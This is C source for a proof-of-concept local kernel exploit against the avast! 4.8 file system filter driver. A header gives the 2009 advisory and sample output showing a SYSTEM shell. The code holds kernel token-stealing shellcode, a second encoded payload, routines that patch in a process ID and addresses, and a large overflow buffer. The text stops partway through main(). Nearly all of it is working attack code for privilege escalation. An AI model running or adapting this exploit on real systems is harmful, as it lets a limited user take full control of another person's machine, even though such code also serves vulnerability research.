#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

/*
Program          : avast! 4.8.1335 Professionnel
Homepage         : http://www.avast.com
Discovery        : 2009/07/29
Author Contacted : 2009/07/31
Found by         : Heurs
This Advisory    : Heurs
Contact          : heurs@ghostsinthstack.org


//----- Application description


avast! antivirus software represents complete virus protection, 
offering full desktop security including a resident shield.
This antivirus is certified by both ICSA Labs and West Coast 
Labs Checkmark.

//----- Description of vulnerability

The File System Filter driver is prone to a local kernel buffer overflow.
This vulnerability allows an intruder to gain SYSTEM privileges on a Windows 
system from a limited user account. 

//----- Proof Of Concept

http://www.sysdream.com/LocalEscalation_Avast.rar

//----- Credits

http://www.sysdream.com
http://ghostsinthestack.org

s.leberre at sysdream dot com
heurs at ghostsinthestack dot org

//----- Greetings

Virtualabs


//-----Exploitation

###############################################
Avast Kernel Buffer Overflow Vulnerability
Proof Of Concept...

===> Found : LocalEscalation_Avast.exe : 2676

Shellcode PID Uploaded !
Shellcode Redirect Uploaded !
Shellcode Stack Uploaded !
Connecting...    Found !
Handle : 0000001C
Microsoft Windows XP [version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\eleve\Bureau>whoami
SYSTEM
###############################################
*/

char UpdateAswMon [] = {
       0x5E, 0x81, 0xEE, 0x6B, 0x03, 0x00, 0x00, 0x81, 0xC6, 0x30, 0x9E, 0x00, 0x00, 0xC7, 0x06, 0x00, 
       0x00, 0x00, 0x00
   };

char ShellcodeMaster[] = "\x33\xf6\x33\xff\x64\xa1\x24\x01\x00\x00\x8b\x40\x44\x05\x88\x00"
"\x00\x00\x8b\xd0\x8b\x58\xfc\x81\xfb\x41\x41\x41\x41\x75\x02\x8b"
"\xf0\x83\xfb\x04\x75\x02\x8b\xf8\x8b\xd6\x23\xd7\x85\xd2\x75\x08"
"\x8b\x00\x3b\xc2\x75\xde\xeb\x10\x8b\xc7\xb9\x40\x00\x00\x00\x03"
"\xc1\x8b\x00\x8b\xde\x89\x04\x19\xba\x11\x11\x11\x11\xb9\x22\x22"
"\x22\x22\xb8\x3b\x00\x00\x00\x8e\xe0\x0f\x35";

char RealShellcode[] = "\x2b\xc9\x83\xe9\xdd\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x15"
"\xf3\x1d\xb8\x83\xeb\xfc\xe2\xf4\xe9\x1b\x59\xb8\x15\xf3\x96\xfd"
"\x29\x78\x61\xbd\x6d\xf2\xf2\x33\x5a\xeb\x96\xe7\x35\xf2\xf6\xf1"
"\x9e\xc7\x96\xb9\xfb\xc2\xdd\x21\xb9\x77\xdd\xcc\x12\x32\xd7\xb5"
"\x14\x31\xf6\x4c\x2e\xa7\x39\xbc\x60\x16\x96\xe7\x31\xf2\xf6\xde"
"\x9e\xff\x56\x33\x4a\xef\x1c\x53\x9e\xef\x96\xb9\xfe\x7a\x41\x9c"
"\x11\x30\x2c\x78\x71\x78\x5d\x88\x90\x33\x65\xb4\x9e\xb3\x11\x33"
"\x65\xef\xb0\x33\x7d\xfb\xf6\xb1\x9e\x73\xad\xb8\x15\xf3\x96\xd0"
"\x29\xac\x2c\x4e\x75\xa5\x94\x40\x96\x33\x66\xe8\x7d\x8d\xc5\x5a"
"\x66\x9b\x85\x46\x9f\xfd\x4a\x47\xf2\x90\x70\xdc\x3b\x96\x65\xdd"
"\x15\xf3\x1d\xb8";

int GetPidByName(char * name_Proc) {
    PROCESSENTRY32 PEntry;
    HANDLE hTool32;
    
    PEntry.dwSize = sizeof(PROCESSENTRY32);
    hTool32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hTool32 == INVALID_HANDLE_VALUE) {
                printf("\nError ==> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)");
                getch();
                exit(0);
                }
    if(!Process32First(hTool32, &PEntry)) {
                                printf("\nError ==> Process32First(hTool32, &PEntry)");
                                getch();
                                exit(0);
                                }
    if (!strcasecmp(PEntry.szExeFile, name_Proc)) {
       printf("===> Found : %s : %d\n\n", PEntry.szExeFile, PEntry.th32ProcessID);
       return PEntry.th32ProcessID;
    }
    //printf(   "\n               Process  :  PID\n");
    while(Process32Next(hTool32, &PEntry) != 0){
        if (strcasecmp(PEntry.szExeFile, name_Proc) == 0) {
                                       CloseHandle(hTool32);
                                       printf("===> Found : %s : %d\n\n", PEntry.szExeFile, PEntry.th32ProcessID);
                                       return PEntry.th32ProcessID;
                                       }
        //printf("===> Trouver : %s : %d\n", PEntry.szExeFile, PEntry.th32ProcessID);
    }
    printf("\n%s n'a pas ete trouve.", name_Proc);
    getch();
    exit(0);
}

void MajShellcode(char * ProcessName){
     DWORD ProcessID;
     DWORD MagicWord = 0x41414141;
     int i;
     
     ProcessID = GetPidByName(ProcessName);
     for (i=0; i<sizeof(ShellcodeMaster); i++) {
         if (!memcmp(ShellcodeMaster+i, &MagicWord, 4)) {
            ShellcodeMaster[i] = (DWORD) ProcessID & 0x000000FF;
            ShellcodeMaster[i+1] = ((DWORD) ProcessID & 0x0000FF00) >> 8;
            ShellcodeMaster[i+2] = ((DWORD) ProcessID & 0x00FF0000) >> 16;
            ShellcodeMaster[i+3] = ((DWORD) ProcessID & 0xFF000000) >> 24;
            printf("Shellcode PID Uploaded !\n");
            return;
         }
     }
     printf("Shellcode PID NOT Uploaded :\'(\n");
     return;
}

void MajRealShellcode(){
     int i;
     DWORD MagicWord = 0x11111111;
     
     for (i=0; i<sizeof(ShellcodeMaster); i++) {
         if (!memcmp(ShellcodeMaster+i, &MagicWord, 4)) {
            ShellcodeMaster[i] = (DWORD) &RealShellcode & 0x000000FF;
            ShellcodeMaster[i+1] = ((DWORD) &RealShellcode & 0x0000FF00) >> 8;
            ShellcodeMaster[i+2] = ((DWORD) &RealShellcode & 0x00FF0000) >> 16;
            ShellcodeMaster[i+3] = ((DWORD) &RealShellcode & 0xFF000000) >> 24;
            printf("Shellcode Redirect Uploaded !\n");
            return;
         }
     }
     printf("Shellcode Redirect NOT Uploaded :\'(\n");
     return;
}

int FindStack(){
     __asm__(
       "mov %eax, %esp\n\t"
       "leave\n\t"
       "ret\n\t"
       );
}

void MajRealStack(){
     int i;
     DWORD MagicWord = 0x22222222;
     DWORD StackLocation = FindStack();
     
     for (i=0; i<sizeof(ShellcodeMaster); i++) {
         if (!memcmp(ShellcodeMaster+i, &MagicWord, 4)) {
            ShellcodeMaster[i] = (DWORD) &StackLocation & 0x000000FF;
            ShellcodeMaster[i+1] = ((DWORD) &StackLocation & 0x0000FF00) >> 8;
            ShellcodeMaster[i+2] = ((DWORD) &StackLocation & 0x00FF0000) >> 16;
            ShellcodeMaster[i+3] = ((DWORD) &StackLocation & 0xFF000000) >> 24;
            printf("Shellcode Stack Uploaded !\n");
            return;
         }
     }
     printf("Shellcode NOT Uploaded :\'(\n");
     return;
}

void AfficherListeFichiers(void) {
    HANDLE hFind;
    WIN32_FIND_DATAW FindData;
    char Dossier[1024];
    
    // Change de dossier
    SetCurrentDirectory(Dossier);
    
    // DÃˆbut de la recherche
    hFind=FindFirstFileW(L"*.*", &FindData);
    if (hFind!=INVALID_HANDLE_VALUE)
    {
        // Si le fichier trouvÃˆ n'est pas un dossier mais bien un fichier, on affiche son nom
        printf("%ws\n",FindData.cFileName);
        // Fichiers suivants
        while (FindNextFileW(hFind, &FindData))
        {
            printf("%ws\n",FindData.cFileName);
        }
    }
    // Fin de la recherche
    FindClose(hFind);
}

int __cdecl main(int argc, char* argv[])
{
    HANDLE hDevice = (HANDLE) 0xffffffff;
    DWORD NombreByte;
    DWORD InitVal=0;
    char welcome[1024], out[50];
    DWORD Crashing []={
        0x73d1dde9, 0x24135758, 0xcd62b301, 0x35a96b72,
        0x45c3745d, 0xcfae802b, 0xed77fbb8, 0xecc2f16d,
        0xa6409255, 0x5b608056, 0x7b2e40db, 0xc250e10c,
        0x284fc4b1, 0xbab9b00d, 0x2fce932c, 0x42d9380b,
        0x72b21bd3, 0x4646eb4c, 0xdfcc6996, 0x4060e991,
        0xce1fa555, 0xeda7ae0b, 0x4f918340, 0x90059feb,
        0xf4cf7bb7, 0x8b0c9a64, 0x9b99f867, 0xd673970a,
        0x591dbc4c, 0x2d54989b, 0xddb9c19d, 0x8121eaac,
        0x199b21f5, 0xc30a1e03, 0x7c618cb1, 0xeb3e06f0,
        0x7cebbd74, 0xaef8a969, 0x25cdcda9, 0xf47297c9,
        0x58855260, 0x9b494eaa, 0x0c11e290, 0x4f1a6361,
        0x75063159, 0xc791bf70, 0x3a1751db, 0xf439049a,
        0x83abe375, 0xba84ad33, 0x3ca8acac, 0x17d3fd7e,
        0x319c0280, 0xcd69a6c1, 0x3fdcdfe6, 0xc3903332,
        0x1377c51c, 0x1cd14365, 0xa98d77f0, 0xd5746f3f,
        0xb3cb7cb2, 0xddd2ecf4, 0x6cb9baa0, 0x4b0e045a,
        0x98b7c236, 0x1203e0e5, 0x32449810, 0xaeb428f7,
        0xa2e7e6e3, 0x3b0443af, 0x1145d62b, 0xaff5c263,
        0xc496b3d7, 0x0b1c45d9, 0x8a463e85, 0x041251c8,
        0x1341294d, 0xacc885c9, 0x03c3b5e7, 0x4cd36063,
        0xbeec4324, 0x313554a7, 0x3b202113, 0xe836e635,
        0x5d65c8bd, 0x8d52bae6, 0x24b3ba7f, 0x9b781fa7,
        0x7efa8335, 0x73e87501, 0x316fcbe4, 0xfcc446bc,
        0x3697162d, 0x5f706b56, 0x3d74846f, 0x57b41e55,
        0x44b39b19, 0x40e6bf38, 0xa1d3527c, 0x20f6b70c,
        0xa772ce22, 0x876cdf3b, 0xa948a3ad, 0x054c9fd6,
        0x6ea65a25, 0x432a376f, 0x4217baa1, 0xd38f0661,
        0x2c40d3d8, 0x33a62f9a, 0x5a8ef7d8, 0x4d07effa,
        0x8ba68789, 0x1441d661, 0xf2f6d48f, 0x77e5d2ae,
        0xcc69ac3e, 0x26cc9de9, 0xd7518e7e, 0xc568abea,
        0x21089cf3, 0xdc3c48a5, 0x6110d1b2, 0x39f65dc9,
        0xd0b8055d, 0xd8cab72c, 0x26be700a, 0x5f028b6c,
        0x1af4a25d, 0xbae98a7c, 0x1d5e94ed, 0xb743fb4a,
        0x274eaede, 0xe84bc6c6, 0xbcc3dd24, 0x47c6b5d5,
        0x3f5a530f, 0x4bbd205e, 0xe5ed455d, 0xc23908e3,
        0xa7255550, 0xfeee9e59, 0x8d91a28c, 0x27f1cd56,
        0xbb7d2468, 0x2e53ae6f, 0x3d8ea58a, 0x9832f31e,
        0x87aca912, 0xf5607f93, 0x67e4d74e, 0xcffd3adf,
        0x38bda32a, 0x1ace8bf1, 0x16ad790d, 0xe7b78a4a,
        0x6e4a4f52, 0xa963805f, 0xb44512ab, 0xaaff642a,
        0x68723e9a, 0x9cb006f2, 0x73439f5a, 0xcca9abc0,
        0x755ec72c, 0xb90d959c, 0x96f5fed2, 0x54821cac,
        0x6d3b9e97, 0x254fa473, 0xe5806bdf, 0x1d3fe779,
        0x5d824e9c, 0x0cba2490, 0x86dafdd4, 0xb84d19dd,
        0x1cf0ecc5, 0x73a4c777, 0x6545b564, 0x12fc70dd,
        0x58357dcd, 0x70524921, 0xa4bf0661, 0xd3630be2,
        0xb4f95085, 0x2f8e9f3f, 0x8fb2c303, 0x5d534373,
        0x330ed7be, 0x090a7fee, 0x70a0936f, 0x91bc5628,
        0x2ad2a9fb, 0x437d15d2, 0xcb860a99, 0x8bbf5d22,
        0x5188ce41, 0xf419337b, 0xfe338d2c, 0xf397167d,
        0xb79f4c9a, 0x982b7bd0, 0xeda0e308, 0x19079984,
        0x44506743, 0x08eb3bff, 0x0b2c7b5e, 0xfc12c449,
        0x122c18c3, 0xcb18effc, 0x65070b56, 0x5bbc5f36,
        0xba194a66, 0x1ac6b812, 0x4936b720, 0x3064f4d9,
        0xea85383a, 0x5669ab43, 0xbfb9b2be, 0x2c961814,
        0x2a16193f, 0x5310fc35, 0x2dcf5351, 0x8fb793bf,
        0x0b4f51df, 0x7f9c69f8, 0x76bbd7bc, 0xc2cd8ee9,
        0xdaded21e, 0xeeb83782, 0xa45e26a1, 0xa94133c2,
        0xaec536ad, 0xa6026a8c, 0xbcb5a191, 0xd7babca3,
        0xb2d31f46, 0x19511dc1, 0x21437e92, 0x0bfaa87e,
        0x32685945, 0x55016b49, 0x994f9293, 0x599f9653,
        0xc492d42b, 0xfa4d8907, 0x6c1e0416, 0x073e9847,
        0x9ceee897, 0x479dec42, 0x60f26898, 0xa0b37906,
        0x7f433088, 0xe617b52a, 0x30df4460, 0x9945c0da,
        0x5f4f9196, 0x5b3095ad, 0x41e4f285, 0x225b324a,
        0xe5f83ba7, 0xbadf8b56, 0xc732f28d, 0xaa94e0d7,
        0x0f9da105, 0x80936817, 0xa3b40d2e, 0xa7d5791c,
        0x10b0a9bb, 0x83b95622, 0x32872694, 0x7b1b3d10,
        0xe0e1adf8, 0x32512498, 0x6bc6ff89, 0x0d11fef7,
        0x3875c984, 0x5a31db0e, 0xdd1df94b, 0x61148636,
        0x7372b587, 0x8856950e, 0x4f0af062, 0xb49ea480,
        0x799ce35e, 0x23ecabd9, 0x137ee004, 0xdd17f948,
        0xf2026141, 0x8afd0e45, 0x1188ac9a, 0x0f87f038,
        0xee43edef, 0x982bf738, 0x78b3ca5f, 0x4d8345d3,
        0x613e2505, 0x16ab7e08, 0xa7e68888, 0xa59d234c,
        0x61655904, 0xbec0d39c, 0x3d0d18b0, 0x8eb7a653,
        0x6bd2ad6f, 0x3fa66b0f, 0x5951c36f, 0x8e5c4bed,
        0x087d3d72, 0x65fdb9b3, 0x7aa0c8a5, 0x26c78496,
        0x3a8946f1, 0xb65f63b2, 0xeacb180d, 0xbda32816,
        0x424f7b1e, 0x667fb713, 0xfe8d6f2c, 0x7f3711ca,
        0x477ecf54, 0xbf36b283, 0x92a7518e, 0xfa378a84,
        0x9ddc8f83, 0xc844b947, 0x3ef9ab12, 0xe892b5b4,
        0x101854b2, 0x8f45e397, 0xa1b134ed, 0x5c2a4d5c,
        0xa887258a, 0xbea01c90, 0xfb77c826, 0x08e87f98,
        0x6c7b0709, 0x1f27fe7d, 0xe9d4d75f, 0xd3ecbaee,
        0x961a35c6, 0x8317caf4, 0xc93141a0, 0x71c2fa12,
        0x79afe953, 0x7024a929, 0x5187beec, 0x439aa4c4,
        0x1b5bf729, 0x20de52a2, 0x5afd531b, 0xcbc6d1dc,
        0x8a6c775d, 0x93823634, 0x31e3c106, 0x5c4756ec,
        0xb322318f, 0x8a8fe323, 0x7d8a483f, 0x538d06a5,
        0xd23e0864, 0x07739d15, 0x46845d65, 0xa90ed2a1,
        0x907709ae, 0x25c51a18, 0x7b361c60, 0xf7f12530,
        0xb5c8b862, 0x1e5579b7, 0x453fde63, 0x5854951c,
        0xb479e4b4, 0x0187185f, 0xe310f406, 0xc5ae83f5,
        0x385149c8, 0xe0538b56, 0x6ffa1c0f, 0x15a8c111,
        0xb901feb0, 0x5cb53fcf, 0x7b9596dd, 0xbedc1ead,
        0x6ea7517e, 0xf1c88cdb, 0x2cf213af, 0x67ebce96,
        0x458465ce, 0x6503c018, 0xf7d61a9b, 0xbb31a712,
        0xe0dc951b, 0x354a28a8, 0x51ecebf3, 0xdbf8e424,
        0xd71a0cd2, 0x708d5b40, 0xdd1cf833, 0xb4be28a4,
        0x41c589c0, 0x5d81889f, 0x97de9f7a, 0x43b18278,
        0x4c312b46, 0x2ec1048d, 0x438d30d9, 0xab7923d6,
        0xd36d6ed0, 0xb6165ede, 0x95369795, 0xd5b1b776,
        0x60fe0b11, 0x087563ae, 0xa709eacf, 0xededbbea,
        0xf134d8ea, 0x1e241ce6, 0x341248d6, 0x6c16117a,
        0x7517ff23, 0x4dfb2eda, 0x7cc84423, 0x96cf942d,
        0x32901498, 0xe3bc3a5d, 0x0b85bdb2, 0x7baf09ca,
        0x6c7b4c01, 0xb3a72934, 0x4d33e464, 0x7dc1cf69,
        0x166756c6, 0x08f5f62f, 0x3db6b309, 0xce886208,
        0x1daf5a03, 0xc724741a, 0xf052f4ed, 0x4297acad,
        0xdc6a5dfe, 0xd0c4a895, 0x97db4437, 0x6e227c97,
        0x05f4dab0, 0x13b4adf4, 0x0d8b71e6, 0x9ff6843d,
        0x0fdb8939, 0x58850dfd, 0x2b21f28e, 0x2603e115,
        0xb09ba646, 0xd6fe719b, 0xe87a9223, 0x18f3b642,
        0x4fb62852, 0xeda5dd40, 0x6e5dbbf4, 0x703a2f1f,
        0x4884a549, 0xb6b85046, 0xdbbb7868, 0xa38e09a3,
        0x66c6fa13, 0xea16a377, 0x1ced6fd3, 0x44a3e920,
        0xfe995619, 0x822d3af3, 0xe8399736, 0xa6ff023c,
        0x19b88da8, 0x9b26e290, 0xc6970f3e, 0x4607d070,
        0x7db5bfd9, 0xbdcc2cd7, 0x946faaf6, 0xfcd89b65,
        0x17712dee, 0x953a0c3f, 0xf1383334, 0xc32e8a92,
        0xeb678cf4, 0xb5265c91, 0x10ec1b31, 0x6d134dc1,
        0x8ae8143e, 0x26ff3968, 0xf579d43c, 0x8f9d85f3,
        0x02fad6bf, 0x3a7be637, 0xeff5542c, 0x71cd227a,
        0x4345de8e, 0x5c9202c7, 0x388f640c, 0x0de7d2cd,
        0xe9b74263, 0xe443d4ef, 0x9cabf0e1, 0x810b8762,
        0x23c14d38, 0x296bd907, 0xdfc31794, 0x026b9455,
        0x7632bccd, 0x8dcf7332, 0x23dcc4c2, 0x32885977,
        0x548fdcc5, 0x9fca128a, 0x294fbc82, 0xf7bcd7db,
        0x9cdcc0a9, 0xe26aec68, 0x04c39cf4, 0x0a8d0d2b,
        0xf72bdf30, 0xff04366a, 0x07e7b40a, 0x9b3b9d18,
        0x859b4b85, 0x53a44769, 0x0b1366e3, 0x39f4c10b,
        0xb1ccbe45, 0x9d31874e, 0xa8e0a3a6, 0x98d4a7d0,
        0xc24240f5, 0x421301e0, 0x09137099, 0x48d2a2dd,
        0x3f0fdb4a, 0xe1a9eb43, 0x84199aff, 0x4eff2f35,
        0xd52f92fd, 0xe99cb709, 0xcb8fc9ce, 0x4cd97110,
        0x035f2194, 0x87e8e12d, 0xecd7a018, 0xff80434f,
        0x5ad4430c, 0x51015613, 0x153a3cf8, 0x8bbb9e84,
        0x31bc1b01, 0x986e7b5e, 0x4708de0c, 0xe51a3ef6,
        0xd279b566, 0x4054b421, 0xd794d868, 0x5e174bd2,
        0xc9480f43, 0x61e1ac80, 0x65c89d78, 0xcc461265,
        0x6f8099a7, 0x76596a5c, 0xe134710e, 0x6ec09d49,
        0x095b4232, 0x251f6d2c, 0xb61f7712, 0x6031640c,
        0x081bb50e, 0xabfcf1aa, 0x303d79f3, 0x4e3caaa9,
        0xf87540ed, 0xf067072c, 0xe1e7f3a1, 0x82dd570b,
        0x2110f555, 0x988cc833, 0x985002b4, 0xedd3b5c3,
        0xf952a2cd, 0x06159e37, 0x1ac3e607, 0xda6888dc,
        0x534a76c9, 0x2a7a4148, 0xb5433071, 0x392f077a,
        0x4f91ca6e, 0x0c7736e0, 0x780dd6ed, 0x626f3aa9,
        0x26db5cac, 0xd12bc3e6, 0x70d14be1, 0x0bc60171,
        0x97203228, 0x66463a8d, 0x0ac460d4, 0xdf1906b3,
        0x0d19058b, 0xaa96fa9a, 0x8b220888, 0xfad29e31,
        0x90049f60, 0xb44780ab, 0xe52554ea, 0xe97a3e9e,
        0x2142a187, 0x6ba5f497, 0xf43334a9, 0xf9fb1c87,
        0x3d1f1949, 0x064149d5, 0x2e39a1e9, 0x35669c1b,
        0x0345c538, 0x623002d5, 0xa280da3a, 0xd32bc66c,
        0x047c437f, 0x2b60c09c, 0x154931e8, 0x2b316b42,
        0xa97028bb, 0x1b26881f, 0x0d93499d, 0xa681e3d0,
        0x64aed3a1, 0xb904296b, 0x6e8ef9c5, 0xc029dbe4,
        0x4c1968ca, 0xacceed0c, 0x0f137d05, 0x71b80cdb,
        0xd0e3a334, 0xab958932, 0x336c6a26, 0x42626069,
        0x2a2d154b, 0x14347b3a, 0xac80cd31, 0x9e9708d5,
        0x1641542a, 0x25d2dd4e, 0x5c434b1d, 0x070569b9,
        0xf0f63b05, 0x2e8328a8, 0xd263cf7b, 0xea1a2370,
        0xcbc81d0b, 0xf2a0075b, 0x141c700e, 0x10628529,
        0x6cec92e5, 0x4aa5f3d6, 0x6c3d960f, 0x942d9d60,
        0x896d6d23, 0xa29ef00b, 0x0502a28d, 0x712f7787,
        0x5235ed70, 0x8945f3eb, 0x4f1ecbdd, 0xb5f457b9,
        0xe7327495, 0xbdc47980, 0x85bf54c1, 0xe054753d,
        0x42e6c82b, 0xb54389bb, 0xef5debf3, 0xcf310c8e,
        0x2a433c26, 0xf209dc9d, 0x8a869d03, 0x45961943,
        0x28f51bb9, 0x643e865c, 0xb410b2d1, 0xaf30a98c,
        0xa004bb79, 0x956b7c41, 0x13e3a21d, 0xca5f4efd,
        0xf13e81c1, 0x4fb74a1e, 0x2a033efb, 0x91ed2e36,
        0xb9bf8c57, 0xc1b65238, 0x2b3b3e0f, 0xbc02c76b,
        0xc56d0a7d, 0xb33685c2, 0x6619d068, 0x13ceb219,
        0x21e2d381, 0xbc04a013, 0xafc763ef, 0xc6c9651d,
        0x9139fb86, 0xdd6fe175, 0x5334d9d7, 0x4b39bc0e,
        0x42035a82, 0x91cba15e, 0xcf931d84, 0x739e2767,
        0x5a1c76fd, 0xd65cb444, 0x02c608e9, 0xc13aa613,
        0x5f9895ec, 0x05928739, 0xd960be14, 0xbc65f387,
        0xb40abdb8, 0x3833c113, 0x1fa8b468, 0x8e907e66,
        0xbca30fa5, 0xef539907, 0x3f130c64, 0xaf133b06,
        0x06d0d5c8, 0xe3e4f1df, 0x185f733d, 0x7ecf9d1e,
        0xdfea3362, 0x33bedbe3, 0xe9a15aed, 0x4aa68eeb,
        0x01e0aaf1, 0xb5ccf205, 0x9426c4cc, 0x3f80b9b4,
        0x017b584a, 0x7ac85b06, 0x4ca27f77, 0x7d8548a2,
        0x19025a74, 0x1d4d204c, 0x0cccb981, 0xf86a72e6,
        0x2a5ef939, 0x778bfe20, 0xf536a9e7, 0x82482d36,
        0x20a8484b, 0x8c08dd85, 0xc82a0739, 0xed52e038,
        0x4e6f5973, 0xd799c606, 0x87dd5c7f, 0x69db7ac2,
        0x56771978, 0xf682c73f, 0x40e5511c, 0xf373bc10,
        0xdecc0fa4, 0xf070df4e, 0x81b33f54, 0xf1d53816,
        0x2c2173e5, 0xae5a23d2, 0x0b9013fd, 0x9005857b,
        0x495aa603, 0x7d7b69b9, 0x80603698, 0xeedd2b37,
        0xaf7f72ea, 0xbe303f21, 0x0ea977f9, 0x0fa0708b,
        0xb5792aa6, 0x87fd2a7e, 0x2bda1cd6, 0x5df64225,
        0x216accb9, 0xc1808941, 0x582679b3, 0x46fbd44d,
        0xe2f76929, 0x548f6e51, 0x4ac3f5d8, 0xe52e62af,
        0x484110c2, 0x492fab5a, 0x2c7accea, 0x7488ca20,
        0xe36a2f99, 0xba1e3785, 0xefa467bc, 0xd4665fc8,
        0x2f5390e2, 0xfe450203, 0xbb624253, 0x551740a0,
        0x7d50b6c9, 0xe9d20aa0, 0x55e69c01, 0x6ab186ee,
        0x1c187ff3, 0x6ce6dff2, 0x120a6ce0, 0xf6c45fd2,
        0x5832b533, 0xb02e3027, 0x170d3041, 0x6f153144,
        0xad980d7f, 0x49f5d3ab, 0xcedca059, 0x3db83dc5,
        0x39c589c0, 0x986e3537, 0xc4d04f1d, 0xd71ee166,
        0x04620370, 0x35beb3cf, 0x39249667, 0x79915fe2,
        0xbe40d4da, 0xd0cab338, 0xdcb53b5a, 0xae884be7,
        0x6250a5df, 0x0949574e, 0x5d5321b8, 0x86d01394,
        0xd517473b, 0xe5f90827, 0x7a8ef843, 0x19869984,
        0x02e8d858, 0x71954f6f, 0x6a9e300b, 0xa8a50e6b,
        0xb935e9e2, 0x69f3e080, 0x3e51ad9b, 0xf485aa30,
        0x4195eb53, 0x2574950c, 0x87c2c9f1, 0x955cecec,
        0x2a89e224, 0x67aed18a, 0x8d473f2a, 0xa089d921,
        0x50197424, 0xa94cacbd, 0xe8cddf16, 0x806b7f0d,
        0xa27648b9, 0x99c702ad, 0x37db9034, 0xe7295b46,
        0xa4bf4bac, 0x43d214a3, 0x8d9bc127, 0x2f72faa5,
        0xf9143ef4, 0xf30bd7bf, 0x86b2517d, 0xb7a833d6,
        0x037c9b1f, 0x9459bc14, 0x0c78aa23, 0xe41cc7dc,
        0x4eda2ed2, 0x8c0a8f08, 0x85a8aff4, 0xae28e3ea,
        0x217269d6, 0x6d221bf7, 0x6f646c75, 0x8c04d0eb,
        0x7d389030, 0x1968785b, 0xe748befe, 0x7fb277a8,
        0xf340540e, 0xf5a6340f, 0x47113529, 0x0c2eab43,
        0xd20d8b05, 0x5306c40e, 0x9c0c1ad3, 0x52a384db,
        0x26ad4373, 0x30872280, 0xc5ef9754, 0x098568fa,
        0xcbc632de, 0x9efa321a, 0x8466cae3, 0x156fa462,
        0x96716caa, 0x3e7cd39b, 0x27506529, 0x34cac20d,
        0x05958b0a, 0xe3b1708f, 0x258ff2e9, 0x913cc9cb,
        0xa5899577, 0xb9885e7b, 0xa559f53e, 0x48d99696,
        0xf2d0826d, 0x0be5f805, 0x385bb433, 0x174121eb,
        0x58bfd2bd, 0x4f4bc6ff, 0xc8fb45a6, 0xfac1da99,
        0xcbb0841f, 0xd33a2a83, 0xdb808b49, 0x110544d1,
        0x3656b868, 0x9527fb34, 0x75d35656, 0xf683f9cc,
        0xe756e3f6, 0x8cf742c1, 0x60c64989, 0x2af6cecc,
        0x0c70ddbb, 0x761077ee, 0xa5b3e47e, 0x52939e81,
        0xa476a7db, 0x02afdf28, 0x181e76a1, 0x094c8ae4,
        0x2035542d, 0xc47a48ab, 0x5f344e89, 0x6c0eaf8d,
        0xed89747c, 0x718af660, 0xed1386e1, 0xfe37f3d2,
        0x06817e6b, 0x600c9381, 0xbab81e8f, 0xe7a49506,
        0xb5070118, 0x2cf72a58, 0xde08c7f4, 0x109eead3,
        0x38ca65ba, 0xab924774, 0x26e006f2, 0x52fc4fc1,
        0x2c4453a1, 0x700a621d, 0x014dc1dc, 0x3aef70de,
        0x7c87331d, 0x89433add, 0xcbf6a8fc, 0x114f4794,
        0xea4e637f, 0x723c4b76, 0x47cc4f6a, 0x87445530,
        0xe83ceb38, 0x4d3e048e, 0x79081724, 0x4bf787fb,
        0x68943c66, 0x40e3d968, 0x6b103a30, 0xaadd17d4,
        0xb3f839e8, 0xac84edf7, 0x931d53b1, 0x0c4d2a0e,
        0x2f6ce387, 0xfed92391, 0x69ee2a6e, 0x48d7bb98,
        0x0ba1cb35, 0x63e12f67, 0x1ce3cb82, 0x099b3a46,
        0x5839b9a4, 0x7f7f4993, 0x59e4ecea, 0xeea5cccd,
        0x447dbf7f, 0xcd8626e1, 0x8d36d4b0, 0xac9e19ec,
        0x797ab5d7, 0x8434b658, 0xbcec7ef7, 0x682c6d93,
        0x762d7c86, 0xf38c8099, 0xafdec42c, 0xc43d09a6,
        0xe49d1217, 0x5e747fe1, 0x24788bb3, 0xaefc2937,
        0x1932f03c, 0x683917c0, 0x66aeed2b, 0x9b18cdd7,
        0x33f680a8, 0x26951569, 0xbaee16a8, 0x9e6c211f,
        0x2588853b, 0x9f46290f, 0x246ae851, 0x18e204f6,
        0x4904ec8f, 0xd90aa3f4, 0xb32d3c27, 0x4c5dc284,
        0xbe4add7f, 0x43d09da9, 0x89c17c35, 0x073879e7,
        0xa563a12e, 0x8a89202c, 0xf15e9e1f, 0x351c54d9,
        0xa0c4fa14, 0x5709de8d, 0x39186894, 0x6d04f1d9,
        0xf11330f7, 0x81d6fb36, 0xa9ed69cb, 0xc6d525a7,
        0x7a95ed1d, 0x0e3cc7ca, 0xf22396d8, 0x454bc69f,
        0x220c180f, 0x413b363d, 0x3034f3b4, 0xd29d8cf2,
        0x54f88e88, 0x48701702, 0xd3bc5e71, 0x7d13dd70,
        0x3c60d934, 0x2f11eff3, 0xc0bfff93, 0xfa8a47f7,
        0x1ae1ec5d, 0xc5ebdc87, 0xe0f9d5ac, 0xf205ec31,
        0x45bf5abb, 0x364757d1, 0xe17d0824, 0x7285cdad,
        0x340f876f, 0xafd04fb5, 0x232b2753, 0x9ed7abb0,
        0xf6fa5267, 0xd0344840, 0x7e1908c7, 0xa7fa0e2a,
        0xa14a1f1c, 0x207f4d88, 0x3a8e8949, 0x0933e39b,
        0x49308b91, 0x744b2e05, 0x8dd691b5, 0x576003b6,
        0x74bf728b, 0x8ec344ea, 0x5c1a8d38, 0xba05b772,
        0xd025c49e, 0xbe9bde06, 0x791d3fde, 0xaac66591,
        0x4fd06cb7, 0x1eb57393, 0x3a132e66, 0x531bed33,
        0xc1161373, 0x584522c2, 0x96427532, 0x9b324e67,
        0x67fd675e, 0x1ca506c6, 0xfec4ce3f, 0xdfbd6229,
        0x1570062a, 0xaf2e42ce, 0x442de8ae, 0xe9da28c2,
        0xd8661dd6, 0xb1fbabfd, 0x5e3b5bd4, 0x5975312a,
        0x727c7734, 0x6edaf6d6, 0xc1c54cf1, 0x0a906333,
        0x81c044d6, 0x38ea12fe, 0x0c1bf270, 0x57818362,
        0x0908d11c, 0x0e5a84ec, 0xadc85814, 0x54e8aa92,
        0xd07c83f7, 0xcc71c686, 0x640e2cbb, 0x03c636a6,
        0x47737c01, 0x9ad77ee7, 0xd179e1a9, 0x8340bb15,
        0x489ed205, 0x40b54fa8, 0x7afb505e, 0xc04f8e16,
        0xb92981c6, 0x604af99f, 0x43c0fd25, 0x1d2b625f,
